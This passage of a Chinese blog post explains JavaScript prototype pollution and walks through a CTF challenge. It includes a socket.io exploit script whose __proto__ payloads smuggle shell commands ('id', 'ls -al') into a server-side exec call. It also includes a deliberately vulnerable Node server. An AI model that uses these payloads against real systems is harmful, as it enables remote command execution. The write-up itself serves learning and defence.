class=\"hljs-built_in\">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class=\"hljs-keyword\">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br>                    <br>                    <span class=\"hljs-built_in\">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125;<br>                <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj[key] = <span class=\"hljs-keyword\">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> newObj;<br>    &#125;<br>&lt;<span class=\"hljs-regexp\">/script&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">else</span> &#123;<br>            newObj = <span class=\"hljs-built_in\">Object</span>.create(proto);<br>            cloneDeep = <span class=\"hljs-literal\">true</span>;<br>&#125;<br>......<br>if (cloneDeep) &#123;<br>            <span class=\"hljs-keyword\">var</span> keys = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyNames(obj);<br><br><br>            <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class=\"hljs-keyword\">var</span> key = keys[i];<br>                <span class=\"hljs-keyword\">var</span> descriptor = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class=\"hljs-keyword\">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br><br>                    <span class=\"hljs-built_in\">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj[key] = <span class=\"hljs-keyword\">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> newObj;<br></code></pre></td></tr></table></figure>\n\n<p>其中这个方法 <code>getOwnPropertyDescriptor()</code>,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 __proto__ 这个属性了，所以可以用这个方法获取到。</p>\n<p>通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 __proto__,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 <code>newObj[key]  = this.clone(obj[key])</code> 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">const</span> io = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'socket.io-client'</span>)<br><span class=\"hljs-keyword\">const</span> socket = io.connect(<span class=\"hljs-string\">'https://chat.dctfq18.def.camp'</span>)  <span class=\"hljs-comment\">// 测试时换为本地地址</span><br><br>socket.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">err</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'received socket error:'</span>)<br>  <span class=\"hljs-built_in\">console</span>.log(err)<br>&#125;)<br><br>socket.on(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">msg</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(msg.from,<span class=\"hljs-string\">\"[\"</span>, msg.channel!==<span class=\"hljs-literal\">undefined</span>?msg.channel:<span class=\"hljs-string\">'Default'</span>,<span class=\"hljs-string\">\"]\"</span>, <span class=\"hljs-string\">\"says:\\n\"</span>, msg.message);<br>&#125;);<br><br>socket.emit(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-string\">`&#123;\"name\":\"xxx\", \"__proto__\":&#123;\"country\":\"xxx';id;echo 'xxx\"&#125;&#125;`</span>);<br>socket.emit(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-built_in\">JSON</span>.stringify(&#123; <span class=\"hljs-attr\">msg</span>: <span class=\"hljs-string\">\"hello\"</span> &#125;));<br>socket.emit(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-string\">`&#123;\"name\":\"xxx\", \"__proto__\":&#123;\"country\":\"xxx';ls -al;echo 'xxx\"&#125;&#125;`</span>);<br></code></pre></td></tr></table></figure>\n\n<p>访问触发：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"15\"></p>\n<p>我们总结一下整个调用链：</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1</span>、客户端传入触发服务端 <span class=\"hljs-function\"><span class=\"hljs-title\">register</span> 事件时的待解析的数据，包含原型的数据 ------&gt;</span><br><span class=\"hljs-number\">2</span>、客户端触发服务端 <span class=\"hljs-function\"><span class=\"hljs-title\">register</span> 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------&gt;</span><br><span class=\"hljs-number\">3</span>、返回一个具有 <span class=\"hljs-function\"><span class=\"hljs-title\">country</span> 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------&gt;</span><br><span class=\"hljs-number\">4</span>、服务端返回执行命令的消息给客户端，攻击达成<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5@ 总结\"></a>5@ 总结</h1><p>利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的<a href=\"https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\" target=\"_blank\" rel=\"noopener\">结果</a>。</p>\n<p>其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 <code>__proto__</code> 等敏感词即可。</p>\n<p>Reference:</p>\n<p><code>https://segmentfault.com/a/1190000008338987</code></p>\n<p><code>https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</code></p>\n<p><code>https://juejin.im/entry/58dfbe0361ff4b006b16638</code></p>\n<p><code>https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more</code></p>\n<p><code>https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor</code></p>\n<p><code>https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。</p>\n<h1 id=\"2-JS-的原型继承机制\"><a href=\"#2-JS-的原型继承机制\" class=\"headerlink\" title=\"2@ JS 的原型继承机制\"></a>2@ JS 的原型继承机制</h1><p>基础知识我在此就不做过多介绍了，还有所疑惑的同学可以<a href=\"https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more\" target=\"_blank\" rel=\"noopener\">戳这</a>,亦或是<a href=\"https://juejin.im/entry/58dfbe0361ff4b006b166388\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<p>这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。</p>\n<blockquote>\n<p>新的关键字<code>class</code>从ES6开始正式被引入到JavaScript中。<code>class</code>的目的就是让定义类更简单。</p>\n</blockquote>\n<p>实际上，class 继承机制仍旧是原型继承实现的。</p>\n<p>我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Person</span><span class=\"hljs-params\">()</span>:</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span><span class=\"hljs-params\">(self,name,age)</span>:</span><br>        self.name = name<br>        self.age = age<br>        self.money = <span class=\"hljs-number\">1000</span><br><br>person = Person(<span class=\"hljs-string\">'rt95'</span>,<span class=\"hljs-number\">20</span>)<br>print(person.money) // <span class=\"hljs-number\">1000</span><br>print(person.name) // rt95<br></code></pre></td></tr></table></figure>\n\n<p>这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。</p>\n<p>反观一下 Js 中的继承例子</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Person</span>(<span class=\"hljs-params\">name, age</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.name = name;<br>        <span class=\"hljs-keyword\">this</span>.age = age;<br>&#125;<br>Person.prototype.money = <span class=\"hljs-number\">1000</span>;<br><span class=\"hljs-keyword\">var</span> person = <span class=\"hljs-keyword\">new</span> Person(<span class=\"hljs-string\">\"rt95\"</span>, <span class=\"hljs-number\">20</span>);<br><span class=\"hljs-built_in\">console</span>.log(person.money);<br><span class=\"hljs-built_in\">console</span>.log(person.name);<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p>我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 <strong>prototype</strong>,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。</p>\n<p>我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：</p>\n<p><code>Person.prototype 和 person.__proto__</code> 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。</p>\n<h2 id=\"2-1-constructor\"><a href=\"#2-1-constructor\" class=\"headerlink\" title=\"2.1 constructor\"></a>2.1 constructor</h2><p>这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">Student.prototype<span class=\"hljs-function\">.<span class=\"hljs-keyword\">constructor</span> = <span class=\"hljs-title\">Student</span>;</span><br></code></pre></td></tr></table></figure>\n\n<p>类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Person</span>(<span class=\"hljs-params\">name</span>) </span>&#123;<br>    <span class=\"hljs-keyword\">this</span>.name = name;<br>&#125;  <br><br>Person.prototype.copy = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;  <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.constructor();<br>&#125;;  <br><br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Student</span>(<span class=\"hljs-params\">name</span>) </span>&#123;  <br>    Person.call(<span class=\"hljs-keyword\">this</span>, name);<br>&#125;  <br><br><br>Student.prototype = <span class=\"hljs-built_in\">Object</span>.create(Person.prototype);<br></code></pre></td></tr></table></figure>\n\n<p>上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！</p>\n<p>我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Foreign</span>(<span class=\"hljs-params\">shame</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">this</span>.shame = shame;<br> &#125;<br><br>Foreign.prototype.copy = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.constructor();<br> &#125;;<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">China</span>(<span class=\"hljs-params\">name, shame</span>) </span>&#123;<br>      Foreign.call(<span class=\"hljs-keyword\">this</span>, shame);<br>      <span class=\"hljs-keyword\">this</span>.name = name;<br> &#125;<br><br><br>China.prototype = <span class=\"hljs-built_in\">Object</span>.create(Foreign.prototype);<br>China.prototype.constructor = China;<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.png\"></p>\n<p>所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。</p>\n<h1 id=\"3-Js-中的原型链污染\"><a href=\"#3-Js-中的原型链污染\" class=\"headerlink\" title=\"3@ Js 中的原型链污染\"></a>3@ Js 中的原型链污染</h1><p>这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">merge</span>(<span class=\"hljs-params\">target, source</span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> key <span class=\"hljs-keyword\">in</span> source) &#123;<br>        <span class=\"hljs-keyword\">if</span> (key <span class=\"hljs-keyword\">in</span> source &amp;&amp; key <span class=\"hljs-keyword\">in</span> target) &#123;<br>            merge(target[key], source[key])<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>函数描述的就是合并两个对象。</p>\n<p>我们先使用原文给出的第一种 payload :</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> o1 = &#123;&#125;<br><span class=\"hljs-keyword\">var</span> o2 = &#123;<span class=\"hljs-attr\">a</span>: <span class=\"hljs-number\">1</span>, <span class=\"hljs-string\">\"__proto__\"</span>: &#123;<span class=\"hljs-attr\">b</span>: <span class=\"hljs-number\">2</span>&#125;&#125;<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.png\"></p>\n<p>可以看到，这种方式合并对象，js 引擎是把  _<em>proto_</em> 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。</p>\n<p>我们再看第二个 payload :</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">let</span> o1 = &#123;&#125;<br><span class=\"hljs-keyword\">let</span> o2 = <span class=\"hljs-built_in\">JSON</span>.parse(<span class=\"hljs-string\">'&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;'</span>)<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p>这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。</p>\n<h2 id=\"3-1-真假-proto\"><a href=\"#3-1-真假-proto\" class=\"headerlink\" title=\"3.1 真假 _proto_\"></a>3.1 真假 _<em>proto_</em></h2><p>我们都知道，js 中每个对象都有自己的 _<em>proto_</em>,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<p>那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？</p>\n<p>我们首先尝试一下直接覆盖最终对象的 __proto__：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.png\"></p>\n<p>我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 __proto__ 属性永远都不可能是最终的那个对象的  __proto__,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 __proto__的方法是不成立的。</p>\n<p>那么有什么办法，我们构造的这个 __proto__会被认定为最终对象的 __proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 __proto__ 属性，排除 那种直接可以操控的办法：</p>\n<p><code>xxx.__proto__.xxx = xxx</code></p>\n<p>但是我们可以构造一个普通的非系统保留的 __proto__ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 __proto__ 属性可以被解析为一个对象的普通属性。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<p>通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 __proto__ 属性，我们可以用下面的方法来检验：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<p>那么我们可以通过键名合并的方式来将这个<code>假的</code> __proto__ 合并到 <code>真的</code> __proto__ 上面。调用上面的 merge() 方法实现。</p>\n<h2 id=\"3-2-其他的几种攻击场景\"><a href=\"#3-2-其他的几种攻击场景\" class=\"headerlink\" title=\"3.2 其他的几种攻击场景\"></a>3.2 其他的几种攻击场景</h2><h3 id=\"1、-控制了多个参数\"><a href=\"#1、-控制了多个参数\" class=\"headerlink\" title=\"1、 控制了多个参数\"></a>1、 控制了多个参数</h3><p>想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"10.png\"></p>\n<p>或者是两个参数：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"11.png\"></p>\n<p>这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"12\"></p>\n<p>当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.__proto__.__proto__ 这种方法来回溯。</p>\n<p>下面给出一个测试例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'url'</span>);<br><span class=\"hljs-keyword\">var</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<br><span class=\"hljs-keyword\">var</span> fs = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'fs'</span>);<br><span class=\"hljs-keyword\">var</span> exec = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>).exec;<br><br>http.createServer(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">req,res</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> req_url = req.url;<br>        <span class=\"hljs-keyword\">var</span> str_url = url.parse(req_url,<span class=\"hljs-literal\">true</span>).query;<br>        <span class=\"hljs-keyword\">var</span> path1 = <span class=\"hljs-built_in\">String</span>(str_url.pathname1);<br>        <span class=\"hljs-keyword\">var</span> path2 = <span class=\"hljs-built_in\">String</span>(str_url.pathname2);<br>        <span class=\"hljs-keyword\">var</span> value = <span class=\"hljs-built_in\">String</span>(str_url.value);<br>        <span class=\"hljs-keyword\">var</span> obj = &#123;<span class=\"hljs-attr\">earth</span>:&#123;<span class=\"hljs-attr\">country</span>:<span class=\"hljs-string\">'UK'</span>&#125;&#125;;<br>        obj[path1][path2] = value;<br>        <span class=\"hljs-built_in\">console</span>.log(obj)<br>        <span class=\"hljs-keyword\">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data,stderr</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err)&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(stderr);<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class=\"hljs-number\">1234</span>);<br></code></pre></td></tr></table></figure>\n\n<p>客户端：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span 